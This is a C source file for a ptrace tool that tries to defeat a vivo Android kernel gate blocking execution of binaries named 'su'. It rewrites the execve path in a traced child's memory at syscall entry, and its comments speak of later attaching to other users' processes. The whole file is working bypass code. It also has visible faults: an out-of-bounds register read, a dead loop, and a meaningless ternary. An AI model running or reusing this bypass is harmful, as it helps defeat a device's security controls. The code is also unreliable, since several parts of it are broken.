/* Decide whether a ptrace redirect can defeat the vivo "su" exec-name gate
 * without touching kernel text.
 *
 * Mechanism under test: the gate keys on the path string the caller passes to
 * execve (measured: same bytes named `sux` run, named `su` get EPERM).  So a
 * tracer that rewrites those bytes at the execve ENTRY stop -- same length, in
 * the tracee's own memory -- hands the call to a different file, and the kernel
 * never sees the name "su".
 *
 * Runs entirely as uid 2000 (adb shell): a tracer may ptrace its own forked
 * child at equal uid.  Root is only needed later, to attach to somebody
 * else's process.
 *
 *   usage: ptrgate <child-path-suffix-su> <redirect-to>
 *   e.g.   ptrgate /data/local/tmp/su /data/local/tmp/sy
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <linux/ptrace.h>
#include <errno.h>

#ifndef __NR_execve
#define __NR_execve 222          /* arm64; verified against asm/unistd.h before use */
#endif

static void hexdump(char *buf, int n)
{
	for (int i = 0; i < n; i++) printf("%02x ", (unsigned char)buf[i]);
	printf("\n");
}

int main(int argc, char **argv)
{
	const char *target = argc > 1 ? argv[1] : "/data/local/tmp/su";
	const char *redirect = argc > 2 ? argv[2] : "/data/local/tmp/sy";
	char path[256];
	snprintf(path, sizeof path, "%s", target);

	pid_t pid = fork();
	if (pid < 0) { perror("fork"); return 1; }

	if (pid == 0) {
		if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0) {
			fprintf(stderr, "child: TRACEME: %s\n", strerror(errno));
			_exit(120);
		}
		kill(getpid(), SIGSTOP);            /* let the parent set up */
		execve(path, (char *[]){ (char *)path, NULL }, (char *[]){ NULL });
		fprintf(stderr, "child: execve(%s) returned: %s\n", path, strerror(errno));
		_exit(111);
	}

	int st;
	if (waitpid(pid, &st, 0) < 0) { perror("waitpid SIGSTOP"); return 1; }
	if (!WIFSTOPPED(st)) { fprintf(stderr, "not stopped: st=%x\n", st); return 1; }

	/* arm64 3.18 has no PTRACE_GETREGS; use the PEEKUSER/POKEUSER register window */
	unsigned long uregs[32];
	for (int i = 0; i < 32; i++) {
		errno = 0;
		long v = ptrace(PTRACE_PEEKUSER, pid, sizeof(long) * i, NULL);
		if (v < 0 && errno) { perror("PEEKUSER"); return 1; }
		uregs[i] = (unsigned long)v;
	}
	printf("tracer: stopped, x0=%#lx x8(nr)=%#lx pc=%#lx sp=%#lx\n",
	       uregs[0], uregs[8], uregs[32], uregs[29]);

	/* The child is stopped in SIGSTOP, before its first syscall.  Step it with
	 * PTRACE_SYSCALL and take the next entry stop, which must be execve. */
	if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) < 0) { perror("SYSCALL resume"); return 1; }
	if (waitpid(pid, &st, 0) < 0) { perror("waitpid entry"); return 1; }
	for (int i = 0; i < 32; i++)
		uregs[i] = (unsigned long)ptrace(PTRACE_PEEKUSER, pid, sizeof(long) * i, NULL);
	printf("tracer: entry stop nr=%#lx x0=%#lx  (%s)\n", uregs[8], uregs[0],
	       uregs[8] == __NR_execve ? "execve" : "NOT execve -- this shot proves nothing");
	if (uregs[8] != __NR_execve) return 2;

	unsigned long p = uregs[0];
	unsigned long aligned = p & ~7UL;
	long word = ptrace(PTRACE_PEEKDATA, pid, (void *)aligned, NULL);
	char buf[8];
	memcpy(buf, &word, 8);
	printf("tracer: peeked word at %#lx: ", aligned);
	hexdump(buf, 8);

	/* rewrite the basename in place, same length: "su" -> "sy" */
	size_t tlen = strlen(target), rlen = strlen(redirect);
	if (tlen != rlen) { fprintf(stderr, "lengths differ (%zu vs %zu): need same-size edit\n", tlen, rlen); return 3; }
	/* the string lives at p; rebuild it wholly inside the tracee's buffer */
	for (size_t off = 0; off < tlen + 1; off += 8) {
		unsigned long a = (p + off) & ~7UL;
		long w = ptrace(PTRACE_PEEKDATA, pid, (void *)a, NULL);
		char b[8];
		memcpy(b, &w, 8);
		for (size_t k = 0; k < 8 && (p + off + (7 - k)) >= p; k++) {
			size_t so = a + (7 - k);          /* walk bytes low->high */
		}
		/* simpler: patch byte-by-byte with the neighbouring word preserved */
		for (size_t i = 0; i < 8; i++) {
			size_t va = a + i;
			if (va < p || va > p + tlen) continue;
			size_t j = va - p;
			b[i] = j < rlen ? redirect[j] : '\0';
		}
		memcpy(&w, b, 8);
		if (ptrace(PTRACE_POKEUSER == 0 ? PTRACE_POKEDATA : PTRACE_POKEDATA,
		           pid, (void *)a, w) < 0) { perror("POKEDATA"); return 4; }
		if (p + off >= p + tlen) break;
	}

	long chk = ptrace(PTRACE_PEEKDATA, pid, (void *)(p & ~7UL), NULL);
	char cb[8];
	memcpy(cb, &chk, 8);
	printf("tracer: after poke: %.8s\n", cb);

	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) perror("DETACH");
	printf("tracer: detached, letting the execve run\n");

	int st2;
	waitpid(pid, &st2, 0);
	printf("tracer: child result: %s exit=%d signo=%d\n",
	       WIFEXITED(st2) ? "exited" : WIFSIGNALED(st2) ? "signalled" : "other",
	       WEXITSTATUS(st2), WIFSIGNALED(st2) ? WTERMSIG(st2) : 0);
	return 0;
}
